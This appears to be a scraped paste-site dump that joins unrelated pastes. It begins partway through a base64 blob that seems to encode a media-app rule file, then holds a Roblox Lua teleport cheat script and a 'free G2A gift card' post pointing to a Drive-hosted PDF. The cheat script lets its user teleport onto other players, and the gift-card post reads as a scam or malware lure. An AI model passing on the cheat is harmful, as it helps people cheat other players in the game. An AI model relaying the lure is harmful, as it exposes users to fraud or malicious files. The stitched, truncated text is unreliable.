dCBjb2xvciA9IGdldFJhbmdlQ29sb3JzKCk7XFxcXG5cXFxcbiAgaWYgKHBhZ2UgPT0gMSkge1xcXFxuICAgIGNhdGVzLmZvckVhY2goKGl0ZW0sIGkpID0+IHtcXFxcbiAgICAgIGxldCB0ID0gY2F0ZWkgPT0gaSA/IFxcXFxcXFwi4oCc4oCc4oCd4oCdXFxcXFxcXCIgKyBcXFxcXFxcIjxiPlxcXFxcXFwiK2l0ZW0udHlwZV9uYW1lLmZvbnRjb2xvcihjb2xvcikgK1xcXFxcXFwiPC9iPlxcXFxcXFwiOiBpdGVtLnR5cGVfbmFtZTtcXFxcbiAgICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IHQsXFxcXG4gICAgICAgIHVybDogJCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoaSwgdGlkKSA9PiB7XFxcXG4gICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJjYXRlaVxcXFxcXFwiLCBpKTtcXFxcbiAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICAgICAgfSwgaSwgaXRlbS50eXBlX2lkKSxcXFxcbiAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICB0aWQ6IGl0ZW0udHlwZV9pZCxcXFxcbiAgICAgICAgICBhY3RpdmU6IGNhdGVpID09IGkgPyB0cnVlIDogZmFsc2UsXFxcXG4gICAgICAgIH1cXFxcbiAgICAgIH0pXFxcXG4gICAgfSlcXFxcbiAgfVxcXFxuXFxcXG4gIGlmIChjYXRlICE9ICdob21lJyAmJiBwYWdlID09IDEpIHtcXFxcbiAgICBsZXQgaG9tZWkgPSBsYXlvdXQuZmluZEluZGV4KHggPT4ge1xcXFxuICAgICAgcmV0dXJuIHguZXh0cmEgJiYgeC5leHRyYS50aWQgPT0gXFxcXFxcXCJob21lXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbiAgICBpZiAoaG9tZWkgPT0gLTEpIHtcXFxcbiAgICAgIGhvbWVpID0gbGF5b3V0LmZpbmRJbmRleCh4ID0+IHtcXFxcbiAgICAgICAgcmV0dXJuIHguZXh0cmEgJiYgeC5leHRyYS50aWQ7XFxcXG4gICAgICB9KSAtIDE7XFxcXG4gICAgfVxcXFxuICAgIGlmIChmaWx0ZXJzICYmIGZpbHRlcnMuaGFzT3duUHJvcGVydHkoY2F0ZSkpIHtcXFxcbiAgICAgIGlmIChob21laSAhPSAtMSkge1xcXFxuICAgICAgICBsYXlvdXQuc3BsaWNlKGhvbWVpICsgMSwgMCwge1xcXFxuICAgICAgICAgIHRpdGxlOiBmb2xkID09IFxcXFxcXFwiMFxcXFxcXFwiID8gXFxcXFxcXCLigJzigJzigJ3igJ08Yj5cXFxcXFxcIiArIFxcXFxcXFwi4oinXFxcXFxcXCIuZm9udGNvbG9yKFxcXFxcXFwiIzFhYWQxOVxcXFxcXFwiKSArIFxcXFxcXFwiPC9iPlxcXFxcXFwiIDogXFxcXFxcXCLigJzigJzigJ3igJ08Yj5cXFxcXFxcIiArIFxcXFxcXFwi4oioXFxcXFxcXCIuZm9udGNvbG9yKFxcXFxcXFwiI0ZGMDAwMFxcXFxcXFwiKSArIFxcXFxcXFwiPC9iPlxcXFxcXFwiLFxcXFxuICAgICAgICAgIGNvbF90eXBlOiBcXFxcXFxcInNjcm9sbF9idXR0b25cXFxcXFxcIixcXFxcbiAgICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgoZm9sZCkgPT4ge1xcXFxuICAgICAgICAgICAgc3RvcmFnZTAuc2V0SXRlbShcXFxcXFxcImZvbGRcXFxcXFxcIiwgZm9sZCA9PSBcXFxcXFxcIjBcXFxcXFxcIiA/IFxcXFxcXFwiMVxcXFxcXFwiIDogXFxcXFxcXCIwXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXFxcbiAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICAgICAgICB9LCBmb2xkKSxcXFxcbiAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgYWN0aXZlOiBmYWxzZSxcXFxcbiAgICAgICAgICB9XFxcXG4gICAgICAgIH0pXFxcXG4gICAgICB9XFxcXG5cXFxcbiAgICAgIGxldCBhY3RpdmVpID0gbGF5b3V0LmZpbmRJbmRleCh4ID0+IHguZXh0cmEgJiYgeC5leHRyYS5hY3RpdmUpO1xcXFxuICAgICAgaWYgKGFjdGl2ZWkgIT0gLTEpIHtcXFxcbiAgICAgICAgbGF5b3V0LnNwbGljZShhY3RpdmVpLCAwLCB7XFxcXG4gICAgICAgICAgdGl0bGU6IFxcXFxcXFwi4oCc4oCc4oCd4oCdXFxcXFxcXCIgKyAn8J+MgCcsXFxcXG4gICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcbiAgICAgICAgICB1cmw6ICQoJyNub0xvYWRpbmcjJykubGF6eVJ1bGUoKGMpID0+IHtcXFxcbiAgICAgICAgICAgIGxldCBjYXRlX29iaiA9IHN0b3JhZ2UwLmdldE15VmFyKFxcXFxcXFwiY2F0ZV9vYmpcXFxcXFxcIiwge30pO1xcXFxuICAgICAgICAgICAgZGVsZXRlIGNhdGVfb2JqW2NdO1xcXFxuICAgICAgICAgICAgc3RvcmFnZTAucHV0TXlWYXIoXFxcXFxcXCJjYXRlX29ialxcXFxcXFwiLCBjYXRlX29iaik7XFxcXG4gICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwidG9hc3Q6Ly/muIXpmaTlrozmiJBcXFxcXFxcIjtcXFxcbiAgICAgICAgICB9LCBjYXRlKVxcXFxuICAgICAgICB9KVxcXFxuICAgICAgfVxcXFxuXFxcXG4gICAgICBsZXQgY2xhc3NpZnkgPSBmaWx0ZXJzW2NhdGVdO1xcXFxuICAgICAgdmFyIGluaXRfY2F0ZSA9IG5ldyBBcnJheShjbGFzc2lmeS5sZW5ndGgpLmZpbGwoXFxcXFxcXCItMVxcXFxcXFwiKTtcXFxcbiAgICAgIGxldCBjYXRlX29iaiA9IHN0b3JhZ2UwLmdldE15VmFyKFxcXFxcXFwiY2F0ZV9vYmpcXFxcXFxcIiwge30pO1xcXFxuICAgICAgY2F0ZV9vYmpbY2F0ZV0gPSBjYXRlX29ialtjYXRlXSA/IGNhdGVfb2JqW2NhdGVdIDogaW5pdF9jYXRlXFxcXG4gICAgICB2YXIgY2F0ZV90ZW1wID0gY2F0ZV9vYmpbY2F0ZV07XFxcXG4gICAgICAvL3ZhciBmaWx0ZXJfZGVmPXN0b3JhZ2UwLmdldEl0ZW0oXFxcXFxcXCJmaWx0ZXJfZGVmXFxcXFxcXCIsIHt9KTtcXFxcbiAgICAgIGNsYXNzaWZ5LmZvckVhY2goKHgsIGluZGV4KSA9PiB7XFxcXG4gICAgICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgICBjb2xfdHlwZTogJ2JsYW5rX2Jsb2NrJ1xcXFxuICAgICAgICB9KVxcXFxuICAgICAgICB4LnZhbHVlLmZvckVhY2goKGl0LCBpKSA9PiB7XFxcXG4gICAgICAgICAgbGV0IHQgPSBpdC5uO1xcXFxuICAgICAgICAgIGlmIChjYXRlX3RlbXBbaW5kZXhdID09IGkpIHtcXFxcbiAgICAgICAgICAgIHQgPSBcXFxcXFxcIjxiPjxmb250IGNvbG9yPVxcXFxcXFwiICsgY29sb3IgKyBcXFxcXFxcIj5cXFxcXFxcIiArIHQgKyBcXFxcXFxcIjwvZm9udD48L2I+XFxcXFxcXCI7XFxcXG4gICAgICAgICAgICBmbFt4LmtleV0gPSBpdC52O1xcXFxuICAgICAgICAgIH1cXFxcbiAgICAgICAgICBpZiAoY2F0ZV90ZW1wW2luZGV4XSA9PSBcXFxcXFxcIi0xXFxcXFxcXCIpIHtcXFxcbiAgICAgICAgICAgIGZsW3gua2V5XSA9IFxcXFxcXFwidW5kZWZpbmVkXFxcXFxcXCI7XFxcXG4gICAgICAgICAgfVxcXFxuICAgICAgICAgIGlmIChmb2xkID09IDEpIHtcXFxcbiAgICAgICAgICAgIGxheW91dC5wdXNoKHtcXFxcbiAgICAgICAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ0nICsgdCxcXFxcbiAgICAgICAgICAgICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKG8pID0+IHtcXFxcbiAgICAgICAgICAgICAgICBsZXQgaSA9IG8uaTtcXFxcbiAgICAgICAgICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcihcXFxcXFxcImlzX2RlZlxcXFxcXFwiLCBcXFxcXFxcIjFcXFxcXFxcIik7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGNhdGVfb2JqID0gc3RvcmFnZTAuZ2V0TXlWYXIoXFxcXFxcXCJjYXRlX29ialxcXFxcXFwiLCB7fSk7XFxcXG5cXFxcbiAgICAgICAgICAgICAgICBsZXQgY2F0ZV90ZW1wID0gby5jYXRlX3RlbXA7XFxcXG4gICAgICAgICAgICAgICAgaWYgKGNhdGVfdGVtcC5jb25zdHJ1Y3RvciAhPSBBcnJheSkge1xcXFxuICAgICAgICAgICAgICAgICAgY2F0ZV90ZW1wID0gW107XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGxldCBpbmRleCA9IG8uaW5kZXg7XFxcXG4gICAgICAgICAgICAgICAgbGV0IGMgPSBjYXRlX3RlbXBbaW5kZXhdIHx8IFxcXFxcXFwiLTFcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICAvL2xvZyhjKVxcXFxuICAgICAgICAgICAgICAgIGlmIChjID09IGkpIHtcXFxcbiAgICAgICAgICAgICAgICAgIG8uY2F0ZV90ZW1wW2luZGV4XSA9IFxcXFxcXFwiLTFcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgby5jYXRlX3RlbXBbaW5kZXhdID0gaSArIFxcXFxcXFwiXFxcXFxcXCI7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIGNhdGVfb2JqW28uY2F0ZV0gPSBjYXRlX3RlbXA7XFxcXG4gICAgICAgICAgICAgICAgLy9sb2coY2F0ZV90ZW1wKVxcXFxuICAgICAgICAgICAgICAgIC8vc3RvcmFnZTAucHV0TXlWYXIoXFxcXFxcXCJjYXRlX3RlbXBcXFxcXFxcIiwgY2F0ZV90ZW1wKTtcXFxcbiAgICAgICAgICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcihcXFxcXFxcImNhdGVfb2JqXFxcXFxcXCIsIGNhdGVfb2JqKTtcXFxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcXFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIjtcXFxcbiAgICAgICAgICAgICAgfSwge1xcXFxuICAgICAgICAgICAgICAgIGluZGV4OiBpbmRleCxcXFxcbiAgICAgICAgICAgICAgICBjYXRlX3RlbXA6IGNhdGVfdGVtcCxcXFxcbiAgICAgICAgICAgICAgICBpOiBpLFxcXFxuICAgICAgICAgICAgICAgIGNhdGU6IGNhdGVcXFxcbiAgICAgICAgICAgICAgfSksXFxcXG4gICAgICAgICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxcXG4gICAgICAgICAgICB9KVxcXFxuICAgICAgICAgIH1cXFxcbiAgICAgICAgfSlcXFxcbiAgICAgIH0pXFxcXG4gICAgfVxcXFxuICB9XFxcXG59XFxcXG5cXFxcbmZ1bmN0aW9uIGdldEZsKCkge1xcXFxuICBmbCA9IE9iamVjdC5rZXlzKGZsKS5maWx0ZXIoa2V5ID0+IGZsW2tleV0gIT09IFxcXFxcXFwidW5kZWZpbmVkXFxcXFxcXCIpLnJlZHVjZSgocmVzLCBrZXkpID0+IHtcXFxcbiAgICByZXNba2V5XSA9IGZsW2tleV07XFxcXG4gICAgcmV0dXJuIHJlcztcXFxcbiAgfSwge30pO1xcXFxuICByZXR1cm4gZmxcXFxcbn1cXFxcblxcXFxuZnVuY3Rpb24gZ2V0Q2F0ZUxpc3QoKSB7XFxcXG4gIHJldHVybiB7XFxcXG4gICAgY2F0ZSxcXFxcbiAgICBob21lbGlzdFxcXFxuICB9XFxcXG59XFxcXG5cXFxcblxcXFxuJC5leHBvcnRzID0ge1xcXFxuICBnZXRjYXRlbGlzdDogZ2V0Q2F0ZUxpc3QsXFxcXG4gIGdldGNhdGVnb3J5czogZ2V0Q2F0ZWdvcnlzLFxcXFxuICBnZXRmbDogZ2V0RmxcXFxcbn1cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLmnKzlnLDop4TliJnnrqHnkIZcXFwiLFxcXCJwYXRoXFxcIjpcXFwiTG9jYWxEaXJcXFwiLFxcXCJydWxlXFxcIjpcXFwianM6XFxcXG5zZXRQYWdlVGl0bGUoXFxcXFxcXCLmlofku7bnrqHnkIZcXFxcXFxcIik7XFxcXG5sZXQgcGF0aCA9IGdldFBhdGgoU3RyaW5nKE1ZX1BBUkFNUy5jcGF0aCkpLnJlcGxhY2UoXFxcXFxcXCJmaWxlOi8vXFxcXFxcXCIsIFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxubGV0IGZpbGVTZWxlY3QgPSAkLnJlcXVpcmUoXFxcXFxcXCJodHRwOi8vaGlrZXIubm9raWEucHJlc3MvaGlrZXJ1bGUvcnVsZWxpc3QuanNvbj9pZD01MDk5XFxcXFxcXCIpO1xcXFxuZmlsZVNlbGVjdC5maWxlU2VsZWN0aW9uKHtcXFxcbiAgICBjYWxsYmFjazogJC50b1N0cmluZygoKSA9PiB7XFxcXG4gICAgICAgIHJldHVybiBcXFxcXFxcImVkaXRGaWxlOi8vZmlsZTovL1xcXFxcXFwiICsgUEFUSDtcXFxcbiAgICB9KSxcXFxcbiAgICBtZW1vcnk6IFxcXFxcXFwiZmlsZXBhdGhcXFxcXFxcIixcXFxcbiAgICBmaWxlVHlwZTogXFxcXFxcXCIuanNcXFxcXFxcIixcXFxcbiAgICBleGl0U2VhcmNoUmVmcmVzaDogdHJ1ZSxcXFxcbiAgICBwYXR0ZXJuOiAwLFxcXFxuICAgIHJvb3REaXJQYXRoOiBwYXRoLFxcXFxuICAgIGluaXRpYWxQYXRoOiBwYXRoLFxcXFxufSwgTVlfUEFSQU1TLm5ld1dpbmRvdyA/IFtdIDogW3tcXFxcbiAgICB0aXRsZTogXFxcXFxcXCLmlrDnqpflj6PmiZPlvIBcXFxcXFxcIixcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0X2NlbnRlcl8xXFxcXFxcXCIsXFxcXG4gICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vcGFnZS9Mb2NhbERpciNub1JlY29yZEhpc3RvcnkjI25vSGlzdG9yeSNcXFxcXFxcIixcXFxcbiAgICBleHRyYToge1xcXFxuICAgICAgICBjcGF0aDogTVlfUEFSQU1TLmNwYXRoLFxcXFxuICAgICAgICBuZXdXaW5kb3c6IHRydWUsXFxcXG4gICAgICAgIHdpbmRvd0lkOiBNWV9SVUxFLnRpdGxlICsgXFxcXFxcXCJAZWRpdGZpbGVcXFxcXFxcIixcXFxcbiAgICAgICAgbGluZVZpc2libGU6IGZhbHNlLFxcXFxuICAgICAgICBwYWdlVGl0bGU6IFxcXFxcXFwi5paH5Lu2566h55CGXFxcXFxcXCJcXFxcbiAgICB9XFxcXG59XSk7XFxcIn1dXCIsXCJwcm94eVwiOlwiXCJ9IiwicGljVXJsIjoiaHR0cHM6Ly9oaWtlcmZhbnMuY29tL3R1Ymlhby9tZXNzeS8zMC5zdmciLCJ0aXRsZSI6Iuino+aekOeuoeeQhiJ9
L5xT3FL3,TP Gui,JOHNDOELOL,Lua,Sunday 2nd of June 2024 10:09:11 AM CDT,"local v0 = Instance.new(""ScreenGui"");
local v1 = game:GetService(""Players"");
local v2 = game:GetService(""UserInputService"");
local v3 = Instance.new(""Frame"");
local v4 = v1.LocalPlayer;
local v5 = Instance.new(""Frame"");
local v6 = Instance.new(""UIAspectRatioConstraint"");
local v7 = Instance.new(""ScrollingFrame"");
local v8 = Instance.new(""UIListLayout"");
local v9 = Instance.new(""UIAspectRatioConstraint"");
local v10 = Instance.new(""UICorner"");
local v11 = Instance.new(""UIAspectRatioConstraint"");
local v12 = Instance.new(""UICorner"");
local v13 = Instance.new(""UIAspectRatioConstraint"");
local v14 = Instance.new(""UIAspectRatioConstraint"");
local v1 = game:GetService(""Players"");
local v2 = game:GetService(""UserInputService"");
local v15 = v3;
local v4 = v1.LocalPlayer;
local v16 = v4:GetMouse();
local v17 = false;
local v18 = false;
local v19 = nil;
local v20, v21, v22;
local function v23()
	if (v18 == false) then
		v19:Disconnect();
		return;
	end
	local v81 = v20 - v16.X;
	local v82 = v21 - v16.Y;
	v15.Position = v22 - UDim2.new(0, v81, 0, v82);
end
v15.MouseEnter:Connect(function()
	v17 = true;
end);
v15.MouseLeave:Connect(function()
	v17 = false;
end);
v2.InputBegan:Connect(function(v84)
	if ((v84.UserInputType == Enum.UserInputType.MouseButton1) or (v84.UserInputType == Enum.UserInputType.Touch)) then
		v18 = v17;
		if v18 then
			v20, v21 = v16.X, v16.Y;
			v22 = v15.Position;
			v19 = v16.Move:Connect(v23);
		end
	end
end);
v2.InputEnded:Connect(function(v85)
	if ((v85.UserInputType == Enum.UserInputType.MouseButton1) or (v85.UserInputType == Enum.UserInputType.Touch)) then
		v18 = false;
	end
end);
v0.Name = ""TP Gui"";
v0.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"");
v0.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
v3.Name = ""Main"";
v3.Parent = v0;
v3.BackgroundColor3 = Color3.fromRGB(62, 62, 62);
v3.BorderColor3 = Color3.fromRGB(0, 0, 0);
v3.BorderSizePixel = 0;
v3.Position = UDim2.new(0.0336134285, 0, 0.25555557, 0);
v3.Size = UDim2.new(0.377610713, 0, 0.506369412, 0);
v3.Draggable = true;
v5.Name = ""Separator"";
v5.Parent = v3;
v5.BackgroundColor3 = Color3.fromRGB(0, 0, 0);
v5.BorderColor3 = Color3.fromRGB(0, 0, 0);
v5.BorderSizePixel = 0;
v5.Position = UDim2.new(0.486156672, 0, 0, 0);
v5.Size = UDim2.new(0.00884955656, 0, 1, 0);
v6.Parent = v5;
v6.AspectRatio = 0.013;
v7.Parent = v3;
v7.Active = true;
v7.BackgroundColor3 = Color3.fromRGB(62, 62, 62);
v7.BorderColor3 = Color3.fromRGB(0, 0, 0);
v7.BorderSizePixel = 0;
v7.Position = UDim2.new(0.491876155, 0, 0, 0);
v7.Size = UDim2.new(0.498360664, 0, 1, 0);
v8.Parent = v7;
v8.HorizontalAlignment = Enum.HorizontalAlignment.Center;
v8.SortOrder = Enum.SortOrder.LayoutOrder;
v8.Padding = UDim.new(0, 7);
v9.Parent = v7;
v9.AspectRatio = 0.708;
v10.Parent = v3;
v13.Parent = v3;
v13.AspectRatio = 1.421;
v14.Parent = v0;
v14.AspectRatio = 1.906;
local function v65()
	for v93, v94 in ipairs(v7:GetChildren()) do
		if v94:IsA(""TextButton"") then
			v94:Destroy();
		end
	end
	for v95, v96 in ipairs(game.Players:GetPlayers()) do
		local v97 = Instance.new(""TextButton"");
		v97.BackgroundColor3 = Color3.fromRGB(107, 109, 107);
		v97.Text = v96.Name;
		v97.Size = UDim2.new(0, 200, 0, 50);
		v97.Position = UDim2.new(0, 0, 0, #v7:GetChildren() * 60);
		v97.Parent = v7;
		v97.MouseButton1Click:Connect(function()
			local v107 = game.Workspace:FindFirstChild(v96.Name):WaitForChild(""HumanoidRootPart"");
			game.Players.LocalPlayer.Character:FindFirstChild(""HumanoidRootPart"").CFrame = v107.CFrame;
		end);
	end
end
v65();
game.Players.PlayerAdded:Connect(v65);
game.Players.PlayerRemoving:Connect(v65);
local v66 = Instance.new(""TextButton"");
v66.Name = ""tptool"";
v66.Parent = v3;
v66.BackgroundColor3 = Color3.fromRGB(107, 107, 107);
v66.BorderColor3 = Color3.fromRGB(0, 0, 0);
v66.BorderSizePixel = 0;
v66.Position = UDim2.new(0.102950826, 0, 0.0877707973, 0);
v66.Size = UDim2.new(0.26557377, 0, 0.839622617, 0);
v66.Font = Enum.Font.SourceSans;
v66.TextColor3 = Color3.fromRGB(0, 0, 0);
v66.TextSize = 14;
v10.Parent = v66;
v11.Parent = v66;
v11.AspectRatio = 0.45;
v66.Text = ""Teleport Tool"";
v66.MouseButton1Click:Connect(function()
	local v86 = Instance.new(""Tool"");
	v86.Name = ""Teleport Tool"";
	v86.RequiresHandle = false;
	v86.Parent = game.Players.LocalPlayer.Backpack;
	local function v91(v104)
		v104.Button1Down:Connect(function()
			local v110 = v104.Hit.p;
			game.Players.LocalPlayer.Character:MoveTo(v110);
		end);
	end
	game.Players.LocalPlayer.CharacterAdded:Connect(function(v105)
		local v106 = game.Players.LocalPlayer:GetMouse();
		v91(v106);
	end);
	v91(game.Players.LocalPlayer:GetMouse());
end);
v2.InputBegan:Connect(function(v92)
	if (v92.KeyCode == Enum.KeyCode.P) then
		v3.Visible = not v3.Visible;
	end
end);"
jhz7yZyM,ü§ëG2A.com Free Gift Card Guide June 2024 Fixü§ë,FeasModz514,JavaScript,Sunday 2nd of June 2024 10:05:09 AM CDT,"G2A.com complimentary gift card & games guide.
Any gift card for free on G2A.com including Steam gift cards & everything else offered.
This is the most current version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?981

Working as of:
June 2nd 2024"
